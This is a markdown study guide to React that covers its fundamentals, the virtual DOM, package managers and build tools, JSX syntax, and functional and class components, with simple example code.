# REACT JS

---

## 1. <u> React Fundamentals </u> -

## 1. What is React :

- React is an _open-source_ JavaScript library developed by _Facebook (now Meta)_ for building user interfaces (UIs), particularly for _single-page applications (SPAs)_ where fast and interactive experiences are crucial.
- First released in 2013, React allows developers to create reusable UI components that manage their own state and can be composed to form complex interfaces.
- Unlike traditional web development approaches that manipulate the DOM directly, React uses a declarative paradigm, where you describe what the UI should look like based on the application's state, and React handles the underlying updates efficiently.
- At its core, React is not a full-fledged framework but a library focused on the **"view"** layer of an application. It can be integrated with other libraries or frameworks for routing, state management, or API handling (e.g., _React Router for navigation or Redux for global state_).
- React's popularity stems from its **simplicity**, **performance optimizations (like the Virtual DOM)**, and a vast ecosystem of tools and extensions. It's used by major companies like **Netflix**, **Airbnb**, and **Instagram** to build dynamic, responsive web and mobile apps (via React Native).

#### Key features include :

- **Components** : The building blocks of React apps, which can be functional (_stateless_) or class-based (_stateful_).
- **JSX** : A syntax extension that lets you write _HTML-like code within JavaScript_, making UI code more intuitive.
- **State and Props** : Mechanisms for managing data _within_ and _between_ components.
- **Hooks** : Introduced in React 16.8, these allow functional components to use state and lifecycle features without classes (e.g., `useState`, `useEffect`).
- React is maintained by Meta and a large community, with regular updates ensuring compatibility with modern web standards.

---

## 2. Why React :

- React has become one of the most widely adopted front-end technologies due to several compelling advantages that address common pain points in UI development. Here's why developers and organizations choose React:

1. **Performance Efficiency** : React's _Virtual DOM minimizes direct DOM manipulations_, which are costly in terms of _browser performance_. Instead of updating the entire page, React computes the minimal changes needed and applies them, leading to faster rendering and better user experiences in complex apps.
2. **Reusability and Modularity** : With a _component-based_ architecture, you can build encapsulated, reusable pieces of UI. This promotes code reuse across projects, reduces _redundancy_, and makes _maintenance easier_. For example, a `Button` component can be styled and reused throughout an app without rewriting code.
3. **Declarative Programming** : React lets you describe the desired UI state rather than imperatively defining each step to achieve it. This makes code more predictable, easier to debug, and aligns well with how developers think about UIs.
4. **Large Ecosystem and Community** : React has a massive community, resulting in abundant resources like tutorials, libraries (e.g., _Material-UI for pre-built components_), and tools (e.g., _Create React App_ for quick setup). This ecosystem accelerates development and provides solutions for common challenges.
5. **Cross-Platform Capabilities** : Beyond web apps, **React Native** extends React to mobile development, allowing code sharing between web and native apps for _iOS_ and _Android_. This reduces development time for multi-platform projects.
6. **SEO and Server-Side Rendering (SSR)** : With frameworks like _Next.js_, React supports SSR, improving initial load times and SEO by rendering pages on the server before sending them to the client.
7. **Developer Experience** : Features like hot module replacement (via tools like Vite or Webpack) enable fast iteration. React's learning curve is relatively gentle for those familiar with JavaScript, and its unidirectional data flow prevents common bugs in data management.
8. **Scalability** : React scales well for large applications, as seen in production use at scale. It integrates seamlessly with state management solutions like _Redux_ or _Context API_ for handling complex data flows.

- In summary, React is chosen for its balance of simplicity, power, and flexibility, making it ideal for everything from small prototypes to enterprise-level applications. However, it requires additional libraries for full app functionality, which can be a pro (customizability) or con (more setup).

---

## 3. React vs Other Frameworks :

- React is often compared to other front-end frameworks like _Angular_, _Vue.js_, _Svelte_, and _Ember.js_. While React is a library focused on UI rendering, others are more opinionated frameworks with built-in features. Here's a detailed comparison:

1. **React vs Angular**:
   - **Nature**: React is a library; Angular is a full framework from Google with built-in tools for routing, forms, HTTP clients, and dependency injection.
   - **Learning Curve**: React is easier to learn if you know JavaScript, but Angular requires understanding TypeScript, RxJS, and its CLI.
   - **Performance**: React's Virtual DOM is efficient for frequent updates; Angular uses change detection, which can be heavier but optimizes with zones.
   - **Data Binding**: React uses unidirectional flow; Angular supports two-way binding, which can simplify forms but lead to complexity.
   - **Use Case**: Choose React for flexibility in large teams; Angular for enterprise apps needing structure.
   - **Community**: Both are huge, but React has more third-party libraries.

2. **React vs Vue.js**:
   - **Nature**: Vue is a progressive framework, similar to React in being lightweight and component-based, but with more built-in directives.
   - **Syntax**: Vue uses single-file components with HTML templates; React uses JSX, which mixes HTML in JS.
   - **State Management**: Vue has Vuex (similar to Redux); React uses Context or Redux.
   - **Performance**: Both use Virtual DOM, but Vue is often lighter and faster for smaller apps.
   - **Learning Curve**: Vue is gentler for beginners; React scales better for complex apps.
   - **Use Case**: Vue for quick prototypes; React for apps needing a vast ecosystem.

3. **React vs Svelte**:
   - **Nature**: Svelte is a compiler that shifts work to build time, producing vanilla JS without a runtime library.
   - **Performance**: Svelte has no Virtual DOM, leading to smaller bundles and faster runtime; React is more mature for large-scale apps.
   - **Syntax**: Svelte uses a template syntax with reactivity; React requires hooks or classes.
   - **Community**: React's is larger; Svelte's is growing rapidly.
   - **Use Case**: Svelte for performance-critical apps; React for reusability and community support.

4. **React vs Ember.js**:
   - **Nature**: Ember is a batteries-included framework with conventions over configuration.
   - **Features**: Ember has built-in routing and testing; React requires add-ons.
   - **Performance**: React is generally faster due to Virtual DOM; Ember focuses on developer productivity.
   - **Use Case**: Ember for apps following strict patterns; React for custom setups.

- Overall, React excels in flexibility and ecosystem size but may require more boilerplate. Choose based on project needs: React for component-focused, scalable UIs; others for more integrated solutions.

---

## 4. SPA Concepts :

- _Single-Page Applications (SPAs)_ are web apps that load a single HTML page and dynamically update content as the user interacts, without full page reloads. React is commonly used for SPAs due to its efficient rendering.

#### Key concepts include :

1. **Client-Side Rendering (CSR)** : The browser downloads JavaScript, which renders the UI. Initial load might be slower, but interactions are fast. React handles this via components that update based on state changes.
2. **Routing** : SPAs use _client-side routers_ (e.g., React Router) to simulate page navigation. Routes map URLs to components without server requests, using browser history API for _back/forward_ navigation.
3. **State Management** : In SPAs, state can be local (component-specific via `useState`) or global (via Context API or Redux). This ensures data persistence across "pages" without reloads.
4. **API Integration** : SPAs fetch data asynchronously from APIs (e.g., using `fetch` or **Axios**). Loading states, error handling, and caching (e.g., with React Query) are crucial for smooth UX.
5. **Lazy Loading** : To optimize performance, SPAs load components or assets on demand (e.g., React's `lazy` and `Suspense`).
6. **SEO Challenges** : SPAs can suffer from poor SEO since content is JS-rendered. Solutions include SSR (e.g., Next.js) or pre-rendering.
7. **Pros** : Fast interactions, rich UX, less server load.
8. **Cons** : Larger initial bundles, SEO issues, reliance on JS.

- In React SPAs, the app starts with a root component (e.g., `<App />`) that renders child components based on routes and state, creating a seamless experience.

---

## 5. Virtual DOM :

- The **Virtual DOM (VDOM)** is a _lightweight_, _in-memory representation_ of the real DOM (Document Object Model) used by React to optimize UI updates. Instead of directly manipulating the browser's DOM, which is slow due to reflows and repaints, React maintains a virtual tree of elements.

#### How it works :

1. **Initial Render** : React creates a VDOM tree from components and renders it to the real DOM.
2. **State/Props Change** : When data changes, React builds a new VDOM tree reflecting the updates.
3. **Diffing (Reconciliation)** : React compares the new VDOM with the previous one using an efficient algorithm (e.g., identifying changed nodes via keys).
4. **Minimal Updates** : Only the differences (diffs) are applied to the real DOM, reducing operations.

#### Benefits :

- **Performance**: Batches updates and minimizes DOM manipulations.
- **Abstraction**: Developers focus on state, not DOM ops.
- **Cross-Platform**: Enables React Native to map VDOM to native views.
- **Drawbacks**: Slight memory overhead for the VDOM tree. In practice, it's a net gain for dynamic UIs. Fiber (React's reconciliation engine since v16) makes this process interruptible for better responsiveness.

---

## 6. React Architecture :

- React's architecture is **component-centric**, emphasizing modularity and _separation of concerns_. It consists of:

1. **Components** : Reusable units that encapsulate UI logic, styles, and behavior. Functional components use hooks; class components use lifecycle methods.
2. **Props** : Immutable data passed from parent to child components, enabling data flow.
3. **State** : Mutable data managed within a component (e.g., via `useState`). _Changes trigger re-renders_.
4. **Lifecycle** : Phases like mounting (initial render), updating (state/prop changes), and unmounting (removal). Hooks like `useEffect` handle side effects.
5. **Context** : For passing data deeply without prop drilling.
6. **Render Pipeline** : JSX is transpiled to `React.createElement` calls, forming a tree that's reconciled to the DOM.
7. **Higher-Order Components (HOCs) and Render Props** : Patterns for code reuse.
8. **Integration Layers** : React can hook into backends via APIs and use tools like Redux for global state or React Router for navigation.

- This architecture promotes composability, making apps easier to build, test, and scale.

---

## 7. React Rendering Model :

- React's rendering model is based on _reconciliation_, where the UI is a function of state: `UI = f(state)`. Key aspects:

1. **Triggering Renders**: State/prop changes or parent re-renders cause a component to re-render.
2. **Reconciliation Process**:
   - **Render Phase**: React calls component functions to build a new VDOM tree.
   - **Commit Phase**: Applies diffs to the real DOM.
3. **Batching**: Multiple state updates are batched for efficiency (e.g., in event handlers).
4. **Concurrent Mode**: (Experimental) Allows interrupting renders for priority tasks, improving responsiveness.
5. **Server-Side Rendering**: In SSR, React renders to HTML strings on the server, then hydrates on the client.
6. **Suspense and Lazy**: For code-splitting and data-fetching, pausing renders until resources load.

- This model ensures efficient, predictable updates, with tools like React DevTools for inspecting renders.

---

## 8. Declarative UI :

- Declarative UI in React means describing _what_ the UI should look like for a given state, rather than _how_ to achieve it imperatively (e.g., manually adding/removing elements).
- Example : Instead of `document.getElementById('el').innerHTML = 'Hello';`, you write `<div>Hello {name}</div>` in JSX. When `name` changes, React automatically updates the DOM.

#### Benefits :

- **Readability**: Code mirrors the UI structure.
- **Predictability**: State drives UI, reducing bugs.
- **Efficiency**: React optimizes the "how" via VDOM.
- Contrast with imperative: jQuery-style DOM manipulation is error-prone in complex apps. Declarative style aligns with functional programming, making React intuitive for state-driven UIs.

---

## 9. Component-Based Architecture :

- React's component-based architecture breaks the UI into independent, reusable components, each handling a specific part of the interface.

#### Key principles :

1. **Encapsulation** : Components manage their own logic, state, and styles (e.g., via CSS-in-JS).
2. **Composition** : Build complex UIs by nesting components (e.g., `<App><Header /><Main /><Footer /></App>`).
3. **Reusability** : Props allow customization without duplication.
4. **Hierarchy** : Forms a tree structure, with data flowing down.

#### Types :

- **Presentational**: Dumb components focused on UI (receive props).
- **Container**: Smart components handling logic/state.
- This approach fosters maintainability, testing (e.g., via Jest), and collaboration, as teams can work on isolated components.

---

## 10. Unidirectional Data Flow :

- _Unidirectional data flow_ (also called one-way data binding) in React means data flows in a single direction: from parent components to children via props. State changes in a parent trigger re-renders down the tree, but children can't directly modify parent state.

#### Mechanics :

1. **Props Down** : Parents pass data to children as props.
2. **Actions Up** : Children communicate changes via callbacks (e.g., `onClick` handlers) passed as props.
3. **No Two-Way Binding** : Unlike Angular, this prevents implicit mutations.

#### Benefits :

- **Predictability** : Easier to trace data origins and changes.
- **Debugging** : Reduces side effects and cycles.
- **Scalability** : Works with flux patterns like Redux, where actions dispatch to a central store.
- **Example** : A parent form component holds state; child inputs receive values via props and update via callbacks. This enforces a clear, controllable data lifecycle.

---

## 2. <u> Environment & Tooling Basics </u> -

## 11. Node.js Basics (for React) :

- Node.js is a _runtime environment_ that allows JavaScript to run on the _server-side_, but in the context of React development, it's primarily used as a tool for _managing dependencies_, _running scripts_, and _building applications_. Created in _2009_ by _Ryan Dahl_, Node.js is built on _Chrome's V8 JavaScript engine_ and enables _asynchronous_, _event-driven programming_, which is ideal for _I/O-heavy tasks_.

#### For React developers :

- **Installation** : Download Node.js from the official website [nodejs.org](https://nodejs.org/en). It comes bundled with npm (Node Package Manager). Use LTS (Long-Term Support) versions for stability, e.g., Node.js 20.x as of 2026.
- **Key Commands** :
  - `node -v` : Check installed version.
  - `node script.js` : Run a JavaScript file.
- **Role in React** : React apps require Node.js to install packages via npm/yarn, run build tools like Webpack or Vite, and execute development servers. For example, when you run `npm start` in a React project, Node.js powers the underlying scripts.
- **Modules** : Node.js uses CommonJS modules (`require`/`module.exports`), but modern React projects often use ES modules (`import`/`export`) via Babel or native support in newer Node versions.
- **Event Loop** : Handles non-blocking operations, ensuring React build processes (like transpiling JSX) don't hang.
- **Best Practices** : Use nvm (Node Version Manager) to switch between Node versions for different projects. Keep Node updated to benefit from performance improvements and security fixes.
- Without Node.js, you can't set up or run a modern React environment, as it's the foundation for the JavaScript ecosystem.

---

## 12. npm :

- npm (Node Package Manager) is the _default package manager_ for Node.js, used to _install_, _manage_, and _share_ JavaScript packages. It's essential for React development, handling dependencies like React itself, React DOM, and _third-party libraries_.

#### Key features and usage :

- **Installation** : Comes with Node.js. Check with `npm -v`.
- **Commands** :
  - `npm init` : Creates a `package.json` file.
  - `npm install <package>` : Installs a package locally (adds to `node_modules` and `package.json`).
  - `npm install -g <package>` : Global install (e.g., for tools like create-react-app).
  - `npm install --save-dev <package>` : Installs as a dev dependency (e.g., for testing tools).
  - `npm run <script>` : Runs scripts defined in `package.json` (e.g., `npm run build`).
  - `npm update` : Updates packages to latest versions within semantic constraints.
  - `npm audit` : Scans for vulnerabilities.
- **Registries** : Defaults to npmjs.com, but can use private registries for enterprise.
- **Lockfile** : Generates `package-lock.json` to ensure consistent installs across environments.
- **Pros** : Vast registry (over 2 million packages as of 2026), easy scripting.
- **Cons** : Can be slow for large projects due to deep dependency trees; uses a lot of disk space.
- npm is the go-to for beginners in React, providing a straightforward way to bootstrap and maintain projects.

---

## 13. yarn :

- **Yarn** is an alternative package manager for JavaScript, developed by _Facebook (now Meta)_ in 2016 as a _faster_, more _reliable alternative_ to npm. It's compatible with npm's registry and `package.json`, making it drop-in replaceable for React projects.

#### Key differences and features :

- **Installation** : `npm install -g yarn` or download from yarnpkg.com. Check with `yarn -v` (Yarn 1.x is classic; Yarn 2+ is modern with Plug'n'Play).
- **Commands** (similar to npm):
  - `yarn init` : Creates `package.json`.
  - `yarn add <package>` : Installs and adds to dependencies.
  - `yarn add --dev <package>` : Dev dependency.
  - `yarn install` : Installs all dependencies.
  - `yarn run <script>` : Runs scripts.
  - `yarn upgrade` : Updates packages.
- **Advantages** :
  - **Speed** : Parallel downloads and caching make it faster than classic npm.
  - **Determinism** : `yarn.lock` ensures exact versions across installs.
  - **Offline Mode** : Caches packages for offline use.
  - **Workspaces** : Great for monorepos (multiple packages in one repo), common in large React apps.
- **Yarn Berry (2+)** : Zero-installs, Plug'n'Play (no `node_modules`), and better performance.
- **Cons** : Slightly different syntax; migration from npm might require adjustments.
- In React, Yarn is popular for its reliability in team environments, especially with Create React App or Next.js.

---

## 14. pnpm (performant npm) :

- _pnpm_ (performant npm) is a _fast_, _disk-efficient package manager_ introduced in _2016_, designed to address _npm's_ and _Yarn's_ shortcomings like duplicated dependencies and large `node_modules` folders. It's fully compatible with the npm ecosystem and ideal for _React monorepos_.

#### Key features :

- **Installation** : `npm install -g pnpm` or via corepack. Check with `pnpm -v`.
- **Commands** :
  - `pnpm init` : Creates `package.json`.
  - `pnpm add <package>` : Installs and adds.
  - `pnpm install` : Installs dependencies.
  - `pnpm run <script>` : Runs scripts.
- **Unique Aspects** :
  - **Symlinked Store** : Uses a _global store for packages_, symlinking them to projects to avoid duplication (saves ~50-90% disk space).
  - **Speed** : Faster installs due to hard links and no hoisting issues.
  - **Strict Mode** : Prevents accidental peer dependency issues.
  - `pnpm-lock.yaml` : Lockfile for consistency.
  - **Workspaces** : Excellent support for monorepos with filtering (e.g., `pnpm --filter=package-name install`).
- **Pros** : Efficient for large projects; secure by default (no arbitrary scripts).
- **Cons** : Less widespread adoption; some tools might need configuration.
- For React developers handling multiple packages or concerned with build times, pnpm is increasingly recommended as of 2026.

---

## 15. Package.json :

`package.json` is a manifest file in JSON format that defines a Node.js/JavaScript project's metadata, dependencies, scripts, and configurations. It's the heart of any React app's dependency management.

#### Structure and key fields :

- **name** and **version** : Project identifier (e.g., "my-react-app": "1.0.0").
- **dependencies** : Runtime packages (e.g., "react": "^18.2.0").
- **devDependencies** : Build/test tools (e.g., "@babel/core": "^7.0.0").
- **scripts** : Custom commands (e.g., "start": "react-scripts start", "build": "react-scripts build").
- **engines** : Specifies Node version (e.g., "node": ">=14").
- **Other** : `main`, `repository`, `license`, `private` (true for non-publishable apps).
- **peerDependencies** : For libraries requiring specific versions (e.g., React plugins).

#### Usage in React :

- Generated by `npm/yarn/pnpm init`.
- Managed via package manager commands.
- Enables reproducible builds with lockfiles.
- Best practices: Keep it clean, use semantic versioning, and commit it to version control (but not `node_modules`).

---

## 16. Semantic Versioning :

- _Semantic Versioning_ (SemVer) is a versioning scheme for packages, defined as **MAJOR.MINOR.PATCH** (e.g., 2.5.1). It's crucial in React ecosystems to manage dependencies without breaking changes.

#### Rules :

- **MAJOR** : Incremented for incompatible API changes (e.g., breaking React hooks).
- **MINOR** : For backward-compatible additions (e.g., new features).
- **PATCH** : For backward-compatible bug fixes.
- **Pre-releases** : e.g., 1.0.0-alpha.1.
- **Caret (^)** : Allows minor/patch updates (e.g., ^1.2.3 → 1.x.x).
- **Tilde (~)** : Patch updates (e.g., ~1.2.3 → 1.2.x).
- **Exact (=)** : Specific version.
- In `package.json`, use ^ for flexibility. Tools like npm semver calculator help. SemVer ensures stable updates in React apps, preventing "dependency hell."

---

## 17. Create React App (CRA) :

- **Create React App (CRA)** is an official CLI tool from Facebook (Meta) for bootstrapping React applications without manual configuration. Launched in 2016, it's ideal for beginners.

#### Usage :

- **Install** : `npx create-react-app my-app` (npx runs without global install).
- **Structure** : Generates folders like `src/` (App.js, index.js), `public/` (index.html).
- **Commands** : `npm start` (dev server), `npm build` (production bundle), `npm test` (Jest), `npm eject` (expose configs).
- **Under the Hood** : Uses Webpack, Babel, ESLint; supports CSS/Sass, TypeScript (via templates).
- **Pros** : Zero-config, fast setup.
- **Cons** : Bloated for large apps; ejection is one-way. As of 2026, alternatives like Vite are gaining traction for speed.

---

## 18. Vite :

- **Vite** is a modern build tool created by Evan You (Vue creator) in 2020, optimized for fast development with ES modules. It's popular for React due to instant **hot module replacement (HMR)**.

#### Features :

- **Setup** : `npm create vite@latest` (select React template).
- **Dev Mode** : Native ES modules for near-instant starts (no bundling).
- **Build Mode** : Uses Rollup for production bundles.
- **Plugins** : Extensive ecosystem (e.g., for React, TypeScript).
- **Commands** : `npm run dev`, `npm run build`.
- **Pros** : Blazing fast (seconds vs. minutes in CRA), small bundles.
- **Cons** : Less opinionated; requires some config for advanced features.
- Vite is the recommended starter for new React projects in 2026.

---

## 19. Parcel :

- _Parcel_ is a zero-config web application bundler introduced in 2017, supporting React out-of-the-box with fast builds and HMR.

#### Features :

- **Setup** : `npm install --save-dev parcel`, add script: "start" : "parcel index.html".
- **Auto-Handling** : Transpiles JSX/TS, optimizes images/CSS, code-splitting.
- **Build** : `parcel build index.html` for production.
- **Pros** : Simple, fast (multi-core), no config needed.
- **Cons** : Less customizable than Webpack; community smaller.
- Great for quick React prototypes.

---

## 20. Webpack Basics :

- _Webpack_ is a module bundler for JavaScript apps, core to many React setups (e.g., CRA). It bundles JS, CSS, images into static assets.

#### Basics :

- **Config** : `webpack.config.js` with entry (starting file), output (bundle path), loaders (e.g., babel-loader for JSX), plugins (e.g., HtmlWebpackPlugin).
- **Modes** : Development (source maps), Production (minification).
- **Dev Server** : Via webpack-dev-server for HMR.
- **In React** : Transforms JSX to JS, handles imports.
- **Pros** : Highly configurable.
- **Cons** : Steep learning curve.

---

## 21. Babel Basics :

- Babel is a JavaScript transpiler that converts modern JS (ES6+, JSX) to browser-compatible code.

#### Basics :

- **Setup** : Install `@babel/core`, `@babel/preset-env`, `@babel/preset-react`.
- **Config** : `.babelrc` or in Webpack.
- **Plugins/Presets** : Transform syntax (e.g., arrow functions, JSX).
- **In React** : Essential for JSX (`<div>` to `React.createElement`).
- **Pros** : Polyfills features.
- **Cons** : Adds build step.

---

## 22. Development vs Production Builds :

- **Development** : Focuses on DX with source maps, HMR, verbose errors. Slower, larger bundles (e.g., `npm run start` in CRA/Vite).
- **Production** : Optimized for performance—minified, tree-shaken, compressed. No dev tools (e.g., `npm run build`). Deploy to servers/CDNs.
- **Differences** : Env vars (process.env.NODE_ENV), plugins toggle behaviors.
- **Best Practices** : Use env files (.env.development, .env.production) for configs.

---

## 23 Folder Structure Conventions :

- Standard React folder structure promotes organization:
- **public/** : Static assets (index.html, favicon).
- **src/** : Source code.
  - **components/** : Reusable UI (e.g., Button.jsx).
  - **pages/** : Route-based components.
  - **assets/** : Images, fonts.
  - **utils/** : Helper functions.
  - **hooks/** : Custom hooks.
  - **contexts/** : Context providers.
  - **services/** : API calls.
  - **styles/** : CSS.
  - **App.js, index.js** : Entry points.
- **tests/** : Unit tests.
- **Root** : package.json, configs.
- Conventions vary (e.g., feature-based in large apps). Use tools like ESLint for consistency.

---

## 3. <u> JSX </u> -

JSX (JavaScript XML) is a syntax extension to JavaScript that looks similar to HTML/XML and is commonly used with React to describe what the UI should look like. It was introduced by React and is not part of the JavaScript language specification, but it gets transpiled (usually by Babel) into regular JavaScript function calls — specifically `React.createElement()` calls.

- JSX makes React code more readable and declarative compared to writing pure `React.createElement()` trees manually.

---

## 24. JSX Syntax Rules :

- JSX follows strict rules to ensure it can be reliably transpiled:

1. **Must return a single root element** :
   Every JSX expression must resolve to exactly one **top-level** element (or a fragment). You cannot return multiple sibling elements without wrapping them.

   ```jsx
   // Invalid
   return <h1>Title</h1><p>Paragraph</p>;

   // Valid
   return (
     <div>
       <h1>Title</h1>
       <p>Paragraph</p>
     </div>
   );
   ```

2. **All tags must be properly closed** :
   JSX is XML-like, so self-closing tags are required for elements without children.

   ```jsx
   <img src="logo.png" alt="Logo" />        // Correct
   <img src="logo.png" alt="Logo">          // Invalid
   ```

3. **Use camelCase for attribute names** :
   HTML attributes are case-insensitive and use **kebab-case**, but JSX uses **camelCase** to match JavaScript property names.

   ```jsx
   <div className="container" tabIndex="0">  // Correct
   <div class="container" tabindex="0">      // Invalid in JSX
   ```

4. **JavaScript expressions go inside curly braces `{}`** :
   Anything inside `{}` is evaluated as JavaScript.

5. **No inline HTML comments** :
   Use JavaScript-style comments inside `{}`.

6. **Attributes that are reserved JavaScript words are renamed** :
   `class` → `className`, `for` → `htmlFor`.

---

## 25. JSX vs HTML :

| Aspect            | HTML                             | JSX (in React)                              |
| ----------------- | -------------------------------- | ------------------------------------------- |
| Syntax            | Markup language                  | JavaScript syntax extension                 |
| Attributes        | `class`, `for`, lowercase        | `className`, `htmlFor`, camelCase           |
| Comments          | `<!-- comment -->`               | `{/* comment */}`                           |
| Event handling    | `onclick="jsCode()"`             | `onClick={handleClick}` (camelCase)         |
| Styling           | `style="color: red;"`            | `style={{ color: 'red' }}` (object)         |
| Execution         | Static, parsed by browser        | Transpiled to `React.createElement()` calls |
| Logic             | Limited (mostly via script tags) | Full JavaScript expressions allowed         |
| Self-closing tags | Optional for void elements       | Required                                    |

- JSX is **not** HTML — it’s syntactic sugar for creating React elements.

---

## 26. Expressions in JSX :

- Any valid JavaScript expression can be embedded inside curly braces `{}`.

```jsx
function Welcome() {
  const name = "Akhil";
  const isLoggedIn = true;
  const currentYear = new Date().getFullYear();

  return (
    <div>
      <h1>Hello, {name.toUpperCase()}!</h1>
      <p>Year: {currentYear}</p>
      <p>Status: {isLoggedIn ? "Active" : "Guest"}</p>
      <p>2 + 2 = {2 + 2}</p>
    </div>
  );
}
```

Expressions can include :

- Variables
- Calculations
- Function calls
- Ternary operators
- Template literals
- Array methods (`.map()`, etc.)
- **Note** : You cannot use statements (if, for, while, etc.) directly inside `{}` — only expressions.

---

## 27. Embedding Variables :

- Variables are embedded using curly braces:

```jsx
const user = {
  name: "Akhil",
  age: 30,
  location: "Port Washington, NY",
};

return (
  <div>
    <h2>{user.name}</h2>
    <p>Age: {user.age}</p>
    <p>From: {user.location}</p>
  </div>
);
```

- You can also embed object properties, array items, or computed values directly.

---

## 28. Conditional Rendering in JSX :

- React does not have built-in directives like `v-if` or `*ngIf`. Instead, use JavaScript control flow inside JSX.

#### Common patterns :

**Ternary Operator** - Most popular for inline conditions :

```jsx
function Greeting({ isLoggedIn }) {
  return (
    <div>
      {isLoggedIn ? <h1>Welcome back, Akhil!</h1> : <h1>Please sign in.</h1>}
    </div>
  );
}
```

**Logical AND (&&) Rendering** :

- Short-circuit evaluation — renders only if the left side is truthy:

```jsx
function Notification({ unreadMessages }) {
  return (
    <div>
      <h1>Mailbox</h1>
      {unreadMessages.length > 0 && (
        <p>You have {unreadMessages.length} unread messages!</p>
      )}
    </div>
  );
}
```

- Very common pattern for "show if condition is true, otherwise nothing".

**If Statements (Outside JSX)** :

- For more complex logic, move conditionals outside the return:

```jsx
function Dashboard({ user }) {
  let content;

  if (!user) {
    content = <p>Please log in</p>;
  } else if (user.role === "admin") {
    content = <AdminPanel />;
  } else {
    content = <UserPanel />;
  }

  return <div>{content}</div>;
}
```

**JSX Fragments** :

- Fragments let you group elements without adding extra DOM nodes. Introduced in React 16.2. Two syntaxes :

1. **Short syntax** (preferred):
   ```jsx
   return (
     <>
       <h1>Title</h1>
       <p>Paragraph</p>
       <footer>© 2026</footer>
     </>
   );
   ```
2. **Explicit `<Fragment>`** (useful when you need a key):

   ```jsx
   import { Fragment } from "react";

   return (
     <Fragment key="unique-key">
       <h1>Title</h1>
       <p>Content</p>
     </Fragment>
   );
   ```

- Fragments are especially useful in lists, tables, or when returning multiple elements from a component.

---

## 29. JSX Attributes :

- Attributes in JSX use _camelCase_ and accept JavaScript expressions :

```jsx
<img
  src={imageUrl}
  alt={`Profile of ${user.name}`}
  className={isActive ? "avatar active" : "avatar"}
  width={size}
  onClick={handleClick}
/>
```

Special cases:

- `style` → object (see below)
- `className` instead of `class`
- `htmlFor` instead of `for`
- Boolean attributes: `<input disabled />` = `<input disabled={true} />`

---

## 30. JSX Styling :

- Two main ways to apply styles:

1. **Inline styles** (object syntax):

   ```jsx
   const style = {
     color: "royalblue",
     fontSize: "1.5rem",
     backgroundColor: isDark ? "#333" : "#fff",
     padding: "16px",
   };
   return <div style={style}>Styled content</div>;
   ```

   - Uses camelCase properties
   - Values are usually strings (except numeric values for px)

2. **CSS classes** (most common):
   ```jsx
   <div className={`card ${isFeatured ? "featured" : ""}`}>Content</div>
   ```
   Often combined with libraries like:
   - Tailwind CSS
   - CSS Modules
   - styled-components
   - Emotion

---

## 31. JSX Comments :

- You cannot use HTML comments in JSX. Use JavaScript comments inside curly braces:

```jsx
<div>
  {/* This is a single-line comment */}
  {/* 
    This is a 
    multi-line comment 
  */}
  <p>Content</p>
</div>
```

- Multi-line comments must be wrapped in `{}` even if they span lines.

---

## 32. JSX Spread Attributes :

- Spread operator (`...`) is useful for passing multiple props at once:

```jsx
const buttonProps = {
  type: "submit",
  disabled: isSubmitting,
  className: "btn-primary",
};
return <button {...buttonProps}>Submit</button>;
```

Common use cases:

- Passing down props to child components
- Merging default props with overrides
- Working with libraries that provide prop objects

---

## 33. JSX Children :

- Children are content passed between opening and closing tags:

```jsx
<Layout>
  <Header />
  <main>Main content goes here</main>
  <Footer year={2026} />
</Layout>
```

Children can be:

- Strings: `<p>Hello</p>`
- JSX elements
- Arrays of elements
- Numbers (rendered as strings)
- `null`, `undefined`, `true`, `false` (ignored)
- Access children in a component via `props.children`:

```jsx
function Layout({ children }) {
  return (
    <div className="layout">
      <header>Header</header>
      <main>{children}</main>
      <footer>Footer</footer>
    </div>
  );
}
```

---

## 34. JSX Keys Concept :

- Keys help React identify which items have changed, been added, or removed in lists. They must be unique among siblings.
- Correct usage:

```jsx
const todos = [
  { id: 1, text: "Learn React" },
  { id: 2, text: "Build project" },
];

return (
  <ul>
    {todos.map((todo) => (
      <li key={todo.id}>{todo.text}</li>
    ))}
  </ul>
);
```

**Best practices**:

- Use stable, unique IDs from data (database ID, UUID)
- Never use array index as key (anti-pattern when list order changes)

**Wrong**:

```jsx
{
  todos.map((todo, index) => <li key={index}>{todo.text}</li>);
}
```

- This causes bugs during reordering, filtering, or animations.
  **Why keys matter** : React uses keys during reconciliation to minimize DOM operations and preserve component state (e.g., form input focus).
- Use `React.Fragment` with `key` when you need fragments in a list:

```jsx
{
  items.map((item) => (
    <Fragment key={item.id}>
      <dt>{item.term}</dt>
      <dd>{item.description}</dd>
    </Fragment>
  ));
}
```

---

## 4. <u> Components </u> -

- Components are the fundamental building blocks of React applications. They are independent, reusable pieces of UI that encapsulate structure, style, and behavior. Components can be _nested_, _managed_, and _composed_ to _create complex interfaces_. React components receive input (props) and return React elements describing what should appear on the screen.

---

## 35. Functional Components :

- Functional components are the modern, _preferred way_ to write React components since the introduction of Hooks in React 16.8. They are simple JavaScript functions that accept props as an argument and return JSX (or null/undefined for no render).

#### Key characteristics :

- **Simplicity** : No `this` keyword, no lifecycle methods (use Hooks instead).
- **Hooks Integration** : Can use state (`useState`), effects (`useEffect`), context (`useContext`), etc.
- **Performance** : Often lighter than class components as they don't create instances.
- **Readability** : Easier to test and understand for most use cases.

Example :

```jsx
import React, { useState } from "react";

function Greeting({ name }) {
  const [greeting, setGreeting] = useState("Hello");

  const handleClick = () => {
    setGreeting("Hi");
  };

  return (
    <div>
      <h1>
        {greeting}, {name}!
      </h1>
      <button onClick={handleClick}>Change Greeting</button>
    </div>
  );
}
// Usage: <Greeting name="Akhil" />
```

- In this example, the component manages local state with `useState` and handles events. Functional components are recommended for new code, as they align with React's shift toward functional programming paradigms.

---

## 36. Class Components (Legacy) :

- Class components are the older way to create React components, using ES6 classes that extend `React.Component`. They were the standard before Hooks and are now considered legacy, though still supported for backward compatibility.

#### Key characteristics :

- **State Management** : Uses `this.state` and `this.setState()`.
- **Lifecycle Methods** : Methods like `componentDidMount`, `componentDidUpdate`, `componentWillUnmount` for side effects.
- **this Binding** : Requires binding methods in the constructor for event handlers.
- **Instances** : Each component creates an instance, which can lead to slightly higher memory usage.

Example :

```jsx
import React from "react";

class UserProfile extends React.Component {
  constructor(props) {
    super(props);
    this.state = { location: "Port Washington, NY" };
    this.handleUpdate = this.handleUpdate.bind(this);
  }

  handleUpdate() {
    this.setState({ location: "New York, NY" });
  }

  render() {
    return (
      <div>
        <h2>User: {this.props.name}</h2>
        <p>Location: {this.state.location}</p>
        <button onClick={this.handleUpdate}>Update Location</button>
      </div>
    );
  }
}
// Usage: <UserProfile name="Akhil" />
```

- While functional components with Hooks can replicate all class features, classes are useful for understanding older codebases or when using error boundaries (via `componentDidCatch`).

---

